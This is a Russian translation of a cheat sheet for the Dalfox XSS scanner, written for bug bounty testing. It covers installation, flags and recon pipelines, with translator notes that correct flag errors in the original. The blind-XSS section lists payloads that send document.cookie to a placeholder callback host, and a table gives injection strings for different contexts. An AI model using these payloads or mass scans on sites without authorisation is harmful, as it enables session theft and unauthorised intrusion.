<a id="-dalfox---xss-scanning-framework"></a>
# 🦊 Dalfox — платформа сканирования XSS

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление репозитория](../../README.ru.md) · [Английский оригинал](../README.md)

> **О версиях.** Оригинал описывает Go-ветку Dalfox v2. По [официальному руководству перехода](https://dalfox.hahwul.com/getting-started/migration/), v3 переписана на Rust: основной режим — `scan`, вместо `-w` используется `--workers`, вместо `-C` — `--cookies`. Старые `url`, `file`, `pipe` сохраняются как скрытые aliases (псевдонимы). Примеры оригинала оставлены дословно; сверяйте параметры со своей версией. Надпись в ASCII-логотипе означает «мощный сканер XSS и инструмент анализа».

```
  ██████╗  █████╗ ██╗     ███████╗ ██████╗ ██╗  ██╗
  ██╔══██╗██╔══██╗██║     ██╔════╝██╔═══██╗╚██╗██╔╝
  ██║  ██║███████║██║     █████╗  ██║   ██║ ╚███╔╝ 
  ██║  ██║██╔══██║██║     ██╔══╝  ██║   ██║ ██╔██╗ 
  ██████╔╝██║  ██║███████╗██║     ╚██████╔╝██╔╝ ██╗
  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝
         Powerful XSS Scanner & Analysis Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Dalfox-XSS_Scanner-blue?style=for-the-badge" alt="Dalfox">
  <img src="https://img.shields.io/badge/Reflected_XSS-green?style=for-the-badge" alt="Reflected">
  <img src="https://img.shields.io/badge/Bug_Bounty-red?style=for-the-badge" alt="Bug Bounty"><br>
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Dalfox](#-what-is-dalfox)
- [Установка](#-installation)
- [Базовое использование](#-basic-usage)
- [Режимы сканирования](#-scanning-modes)
- [Расширенные параметры](#-advanced-options)
- [Слепая XSS](#-blind-xss)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-dalfox"></a>
## 🎯 Что такое Dalfox

**Dalfox** — мощный сканер XSS-уязвимостей и инструмент анализа:

- 🔍 **Анализ параметров** — поиск мест отражения введённых данных
- 🎯 **Обнаружение XSS** — отражённой и основанной на DOM
- 💉 **Слепая XSS** — проверка по внешнему каналу (out-of-band, OOB)
- ⚡ **Скорость** — реализация на Go с большим числом параллельных задач

<a id="why-dalfox"></a>
### Зачем использовать Dalfox?

> **Уточнение.** Возможности WAF и поиск параметров в таблице — краткие формулировки оригинала; обнаружение WAF не гарантирует обход, а отражение данных само по себе не доказывает XSS. В [справке v3](https://dalfox.hahwul.com/reference/cli/) DOM-mining ищет имена параметров в HTML-атрибутах `id`/`name`; это отдельный этап от анализа JavaScript для DOM-XSS.

| Возможность | Преимущество |
|---------|---------|
| Интеллектуальный анализ | Полезные нагрузки с учётом контекста |
| Обнаружение WAF | Обход распространённых межсетевых экранов веб-приложений |
| Слепая XSS | Поддержка взаимодействия по внешнему каналу |
| Режим mining | Поиск параметров в JavaScript |

---

<a id="-installation"></a>
## 🚀 Установка

```bash
# Установка через Go (рекомендуется в оригинале)
go install github.com/hahwul/dalfox/v2@latest

# Homebrew (macOS)
brew install dalfox

# Snap (Linux)
sudo snap install dalfox

# Проверить версию
dalfox version
```

---

<a id="-basic-usage"></a>
## 📖 Базовое использование

<a id="single-url"></a>
### Один URL

```bash
# Базовое сканирование
dalfox url https://example.com/search?q=test

# Сохранить результат
dalfox url https://example.com/search?q=test -o results.txt
```

<a id="multiple-urls"></a>
### Несколько URL

```bash
# Из стандартного ввода
cat urls.txt | dalfox pipe

# Из файла
dalfox file urls.txt

# С параллельной обработкой
cat urls.txt | dalfox pipe -w 50
```

<a id="silent-mode"></a>
### Тихий режим

```bash
# Показывать только уязвимости (формулировка оригинала; см. уточнение)
dalfox url https://example.com/search?q=test --silence

# Без цветного вывода
dalfox url https://example.com/search?q=test --no-color
```

---

<a id="-scanning-modes"></a>
## 🔎 Режимы сканирования

<a id="url-mode"></a>
### Режим URL

```bash
# Сканировать один URL
dalfox url https://example.com/page?param=value

# Сканировать с данными в теле запроса
dalfox url https://example.com/page?param=value -d "post_param=value"
```

<a id="pipe-mode"></a>
### Режим pipe

```bash
# Из стандартного ввода
echo "https://example.com/search?q=test" | dalfox pipe

# Несколько URL
cat urls_with_params.txt | dalfox pipe
```

<a id="file-mode"></a>
### Режим file

```bash
# Из файла
dalfox file urls.txt

# С записью результата
dalfox file urls.txt -o results.txt
```

<a id="server-mode"></a>
### Режим сервера

> **Уточнение.** В [исходном коде v2.13.0](https://github.com/hahwul/dalfox/blob/v2.13.0/cmd/server.go) порт задаётся через `--port`, по умолчанию — `6664`. Приведённые ниже `-p 8080` и адрес с портом `8090` не соответствуют этой конфигурации. Поля запросов API также зависят от версии.

```bash
# Запустить API-сервер
dalfox server

# Другой порт (пример оригинала; см. уточнение)
dalfox server -p 8080

# Затем отправить запросы (адрес оригинала; см. уточнение):
# POST http://localhost:8090/scan
# {"url": "https://example.com/search?q=test"}
```

---

<a id="-advanced-options"></a>
## ⚙️ Расширенные параметры

<a id="custom-headers"></a>
### Пользовательские заголовки

```bash
# Добавить заголовок
dalfox url https://example.com/search?q=test -H "Authorization: Bearer token"

# Несколько заголовков
dalfox url https://example.com/search?q=test \
  -H "Cookie: session=abc" \
  -H "X-Forwarded-For: 127.0.0.1"
```

<a id="cookie--authentication"></a>
### Cookie и аутентификация

> **Уточнение.** Флаг `--basic-auth` отсутствует в [реестре флагов v2.13.0](https://github.com/hahwul/dalfox/blob/v2.13.0/cmd/root.go) и [текущей справке CLI](https://dalfox.hahwul.com/reference/cli/); пример сохранён как в оригинале.

```bash
# С cookie
dalfox url https://example.com/search?q=test -C "session=abc123"

# Базовая аутентификация (пример оригинала; см. уточнение)
dalfox url https://example.com/search?q=test --basic-auth "user:pass"
```

<a id="custom-payloads"></a>
### Собственные полезные нагрузки

> **Уточнение.** В [v2.13.0](https://github.com/hahwul/dalfox/blob/v2.13.0/cmd/root.go) `-p` выбирает **параметры для проверки**, а не задаёт payload (полезную нагрузку). Для файла полезных нагрузок предусмотрен `--custom-payload`. Поэтому пример с `-p` ниже и соответствующая строка краткого справочника имеют ошибочное описание в оригинале.

```bash
# Использовать файл собственных полезных нагрузок
dalfox url https://example.com/search?q=test --custom-payload payloads.txt

# Одна собственная полезная нагрузка (пример оригинала; см. уточнение)
dalfox url https://example.com/search?q=test -p '<script>alert(1)</script>'

# Формат полезных нагрузок в файле:
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# <svg onload=alert(1)>
```

<a id="output-formats"></a>
### Форматы вывода

> **Уточнение.** В [v2.13.0](https://github.com/hahwul/dalfox/blob/v2.13.0/cmd/root.go) `--only-poc` требует значение: например, `v` для подтверждённых результатов или `r` для отражений. В той же версии `--silence` оставляет PoC и сведения о ходе работы, поэтому название «только уязвимости» в оригинале упрощено.

```bash
# Вывод JSON
dalfox url https://example.com/search?q=test --format json -o result.json

# Только уязвимости (пример оригинала; см. уточнение)
dalfox url https://example.com/search?q=test --only-poc
```

<a id="performance"></a>
### Производительность

```bash
# Задать число рабочих задач (параллелизм)
dalfox url https://example.com/search?q=test -w 100

# Время ожидания ответа (секунды)
dalfox url https://example.com/search?q=test --timeout 10

# Задержка между запросами (мс)
dalfox url https://example.com/search?q=test --delay 100
```

<a id="waf-evasion"></a>
### Обход WAF

> **Уточнение.** В [v2.13.0](https://github.com/hahwul/dalfox/blob/v2.13.0/cmd/root.go) `--waf-evasion` регулирует скорость при обнаружении WAF. Флаг `--skip-mining` пропускает поиск параметров, а не отпечатки WAF; это имя из v3, тогда как в v2 используется `--skip-mining-all`. См. [руководство перехода](https://dalfox.hahwul.com/getting-started/migration/).

```bash
# Использовать обход WAF (см. уточнение)
dalfox url https://example.com/search?q=test --waf-evasion

# Игнорировать отпечаток (подпись оригинала; см. уточнение)
dalfox url https://example.com/search?q=test --skip-mining
```

<a id="proxy"></a>
### Прокси

```bash
# HTTP-прокси
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080

# Для Burp Suite
dalfox url https://example.com/search?q=test --proxy http://127.0.0.1:8080
```

---

<a id="-blind-xss"></a>
## 💉 Слепая XSS (Blind XSS)

<a id="using-blind-xss-payload"></a>
### Использование полезной нагрузки для слепой XSS

```bash
# С XSS Hunter / Burp Collaborator
dalfox url https://example.com/form?input=test -b "https://your.xss.ht"

# Флаг -b добавляет обратные вызовы для слепой XSS
```

<a id="blind-xss-with-custom-payload"></a>
### Слепая XSS с собственной полезной нагрузкой

> **Уточнение.** В [v2.13.0](https://github.com/hahwul/dalfox/blob/v2.13.0/cmd/root.go) для файла именно слепых XSS-нагрузок предусмотрен `--custom-blind-xss-payload`. Здесь сохранено исходное сочетание `--blind` с общим файлом `--custom-payload`.

```bash
# Собственная полезная нагрузка для слепой XSS
dalfox url https://example.com/form?name=test \
  --blind "https://your.xss.ht" \
  --custom-payload blind_payloads.txt
```

<a id="example-blind-payloads"></a>
### Примеры полезных нагрузок для слепой XSS

```html
"><img src=x onerror="fetch('https://your.xss.ht/'+document.cookie)">
"><script src="https://your.xss.ht"></script>
'"><script>new Image().src="https://your.xss.ht/?c="+document.cookie</script>
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="basic-commands"></a>
### Базовые команды

| Команда | Описание |
|---------|-------------|
| `dalfox url URL` | Сканировать один URL |
| `dalfox file file.txt` | Сканировать URL из файла |
| `cat urls \| dalfox pipe` | Сканировать URL из стандартного ввода |
| `dalfox server` | Запустить API-сервер |

<a id="essential-flags"></a>
### Основные флаги

| Флаг | Описание |
|------|-------------|
| `-o file.txt` | Файл вывода |
| `-w 50` | Число рабочих задач (параллелизм) |
| `-H "Header: value"` | Пользовательский заголовок |
| `-C "cookie=value"` | Cookie |
| `-b "url"` | Адрес обратного вызова для слепой XSS |
| `--proxy URL` | HTTP-прокси |
| `--timeout 10` | Время ожидания ответа на запрос |

<a id="output-options"></a>
### Параметры вывода

| Флаг | Описание |
|------|-------------|
| `--format json` | Вывод JSON |
| `--only-poc` | Показывать только подтверждения концепции (PoC; см. уточнение) |
| `--silence` | Тихий режим |
| `--no-color` | Отключить цветной вывод |

<a id="payload-options"></a>
### Параметры полезных нагрузок

| Флаг | Описание |
|------|-------------|
| `-p "payload"` | Собственная полезная нагрузка (описание оригинала; см. уточнение) |
| `--custom-payload file` | Файл полезных нагрузок |
| `--waf-evasion` | Режим обхода WAF (см. уточнение) |

---

<a id="-bug-bounty-workflows"></a>
## 🎯 Рабочие процессы Bug Bounty

<a id="basic-xss-scan"></a>
### Базовое сканирование XSS

```bash
# Быстрое сканирование
dalfox url "https://target.com/search?q=test" --silence
```

<a id="from-url-collection"></a>
### Сбор URL и сканирование

```bash
# GAU + Dalfox
gau target.com | grep "=" | dalfox pipe -o xss_results.txt

# Wayback + Dalfox
echo target.com | waybackurls | grep "=" | dalfox pipe --silence
```

<a id="mass-scanning"></a>
### Массовое сканирование

```bash
# Сканировать все параметры URL
cat all_urls.txt | grep "?" | dalfox pipe -w 100 -o found_xss.txt
```

<a id="with-gf-patterns"></a>
### С шаблонами GF

```bash
# Использование GF + Dalfox
gau target.com | gf xss | dalfox pipe --silence

# С фильтрацией через httpx
gau target.com | gf xss | httpx -silent | dalfox pipe
```

<a id="authenticated-scanning"></a>
### Сканирование с аутентификацией

```bash
# С сеансом пользователя
dalfox url "https://target.com/dashboard?search=test" \
  -C "session=abc123" \
  -H "Authorization: Bearer token" \
  -o auth_xss.txt
```

<a id="comprehensive-pipeline"></a>
### Полная цепочка обработки

```bash
# Полная цепочка поиска XSS
subfinder -d target.com -silent | \
  httpx -silent | \
  gau | \
  gf xss | \
  uro | \
  dalfox pipe -w 50 --silence -o xss_vulnerabilities.txt
```

<a id="blind-xss-campaign"></a>
### Серия проверок слепой XSS

```bash
# Массовые проверки слепой XSS
cat contact_forms.txt | dalfox pipe -b "https://your.xss.ht" --silence

# Специально для форм ввода
cat form_urls.txt | dalfox pipe \
  -b "https://your.xss.ht" \
  --custom-payload blind_xss.txt \
  -w 10
```

---

<a id="-xss-hunting-tips"></a>
## 💡 Советы по поиску XSS

> **Уточнение.** Упомянутый ниже заголовок [X-XSS-Protection устарел](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-XSS-Protection). Наличие этого заголовка или CSP само по себе не подтверждает защиту от XSS; сочетание с открытым перенаправлением тоже не гарантирует больший ущерб.

1. **Проверяйте все параметры** — включая неочевидные
2. **Проверяйте разные контексты** — HTML, JavaScript и атрибуты
3. **Используйте слепую XSS** — для административных панелей и журналов
4. **Комбинируйте с открытым перенаправлением** — для увеличения возможного воздействия
5. **Проверяйте заголовки ответа** — CSP и X-XSS-Protection
6. **Проверяйте параметры POST** — их часто упускают

<a id="common-xss-injection-points"></a>
### Распространённые точки внедрения XSS

```
- Поля поиска
- Поля профиля пользователя
- Комментарии и обратная связь
- Параметры URL
- HTTP-заголовки (Referer, User-Agent)
- Имена загружаемых файлов
- Сообщения об ошибках
```

<a id="context-specific-payloads"></a>
### Полезные нагрузки для разных контекстов

| Контекст | Полезная нагрузка |
|---------|---------|
| HTML | `<script>alert(1)</script>` |
| Атрибут | `" onmouseover="alert(1)"` |
| JavaScript | `';alert(1)//` |
| URL | `javascript:alert(1)` |

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Dalfox на GitHub](https://github.com/hahwul/dalfox)
- [Полезные нагрузки XSS](https://github.com/payloadbox/xss-payload-list)

<a id="related-cheatsheets"></a>
### Связанные справочники
- [Методология Bug Bounty](../../Bug-Bounty-Methodology/translations/README.ru.md)
- [Полезные нагрузки XSS](../../Payloads/XSS.md)
- [Burp Suite](../../Burp-Suite/translations/README.ru.md)

---

<p align="center">
  <b>🦊 Находите XSS-уязвимости!</b><br>
  <i>Dalfox — помощник исследователя XSS</i>
</p>
